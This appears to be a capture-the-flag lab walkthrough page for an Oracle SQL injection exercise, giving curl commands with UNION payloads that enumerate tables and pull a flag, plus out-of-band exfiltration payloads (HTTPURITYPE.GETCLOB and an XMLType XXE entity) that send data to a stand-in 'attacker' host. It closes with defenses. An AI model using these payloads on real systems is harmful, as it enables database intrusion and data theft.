<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab10" \<br> --data-urlencode "customer=' OR 1=1 -- "<br><br>
        <span class="prompt">Input: </span>' OR 1=1 -- <br>
        <span class="prompt">SQL: </span>SELECT id, product, total_price, status FROM orders WHERE customer = '' OR 1=1 -- '<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Product:</strong> Laptop Pro: <strong>Status:</strong> shipped<br>
        <strong>Product:</strong> Wireless Headset: <strong>Status:</strong> processing<br>
        <strong>Product:</strong> USB-C Dock: <strong>Status:</strong> delivered<br>
        <strong>Product:</strong> Monitor 27in: <strong>Status:</strong> shipped
    </div>
</div>

<h4>Step 2: Enumerate Tables</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Table Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab10" \<br> --data-urlencode "customer=XXXXNOMATCH' UNION SELECT 0, table_name, 0, 'x' FROM user_tables -- "<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Product:</strong> ORDERS<br>
        <strong>Product:</strong> <strong>INTERNAL_FLAGS</strong>
    </div>
</div>

<h4>Step 3: Extract Flag via UNION</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "customer=XXXXNOMATCH' UNION SELECT 0, column_name, 0, data_type FROM all_tab_columns WHERE table_name='INTERNAL_FLAGS' -- "<br>
        <span class="prompt">Columns: </span>ID (NUMBER), FLAG (VARCHAR2)<br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab10" \<br> --data-urlencode "customer=XXXXNOMATCH' UNION SELECT id, flag, 0, 'x' FROM internal_flags -- "<br>
        <span class="prompt">Output: </span><strong>Product:</strong> <strong>FLAG{or_httpur1typ3_xx3}</strong>
    </div>
</div>

<h4>Step 4: HTTPURITYPE OOB Technique (Tested)</h4>
<p>
    <code>HTTPURITYPE</code> is an Oracle object type for HTTP URIs. Its <code>.GETCLOB()</code>
    method fetches remote content via HTTP: exfiltrating data embedded in the URL.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. HTTPURITYPE Attempt</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "customer=' OR 1=(SELECT HTTPURITYPE('http://attacker/' || (SELECT flag FROM internal_flags WHERE ROWNUM&lt;=1)).GETCLOB() FROM DUAL) -- "<br><br>
        <span class="prompt">Input: </span>' OR 1=(SELECT HTTPURITYPE('http://attacker/' || (SELECT flag FROM internal_flags WHERE ROWNUM&lt;=1)).GETCLOB() FROM DUAL) -- <br>
        <span class="prompt">Error: </span><strong>ORA-00932: inconsistent datatypes: expected - got CLOB</strong><br><br>
        <span class="prompt">// GETCLOB() returns CLOB type, causing type mismatch in WHERE.</span><br>
        <span class="prompt">// With correct type handling and ACL permissions, Oracle would send:</span><br>
        <span class="prompt">// GET /FLAG{or_httpur1typ3_xx3} HTTP/1.1 to attacker's server</span>
    </div>
</div>

<h4>Step 5: XXE via XMLType (Advanced)</h4>
<p>
    <code>XMLType()</code> with external entities provides another OOB channel that may bypass
    UTL_HTTP/HTTPURITYPE restrictions.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. XXE Concept</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Payload: </span>' AND EXTRACTVALUE(XMLType('&lt;?xml version="1.0"?&gt;<br>
        &nbsp;&nbsp;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "http://attacker/'<br>
        &nbsp;&nbsp;|| (SELECT flag FROM internal_flags WHERE ROWNUM&lt;=1)<br>
        &nbsp;&nbsp;|| '"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;'),'/root') IS NOT NULL: <br><br>
        <span class="prompt">Flow:</span><br>
        1. Oracle parses the XML document<br>
        2. XML parser resolves the external entity via HTTP<br>
        3. Request sent to attacker with flag in URL path<br>
        4. Works through XML parser, not UTL_HTTP
    </div>
</div>

<h4>Step 6: OOB Technique Comparison</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. OOB Methods</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">UTL_HTTP.REQUEST():      </span>Function, returns VARCHAR2, requires EXECUTE priv<br>
        <span class="prompt">HTTPURITYPE.GETCLOB():   </span>Object method, returns CLOB, may bypass UTL_HTTP revoke<br>
        <span class="prompt">XMLType XXE:             </span>XML entity resolution, separate from UTL packages<br>
        <span class="prompt">UTL_INADDR:              </span>DNS-based OOB (hostname in error message)<br><br>
        <span class="prompt">All require: </span>Outbound network access from Oracle server + ACL permissions
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{or_httpur1typ3_xx3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab10" \<br> --data-urlencode "customer=XXXXNOMATCH' UNION SELECT id, flag, 0, 'x' FROM internal_flags -- "<br><br>
        <span class="prompt">// Verified output:</span><br>
        <strong>Product:</strong> FLAG{or_httpur1typ3_xx3}
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>HTTPURITYPE</code> provides an alternative OOB exfiltration channel.
    Its <code>.GETCLOB()</code> method triggers HTTP requests, embedding stolen data in the URL.
    XXE via <code>XMLType()</code> is yet another OOB vector through XML entity resolution.
    All OOB techniques require outbound network access and appropriate ACL permissions.
    Defense: restrict outbound HTTP, disable external entity resolution, revoke HTTPURITYPE privileges,
    and use bind variables.
</div>
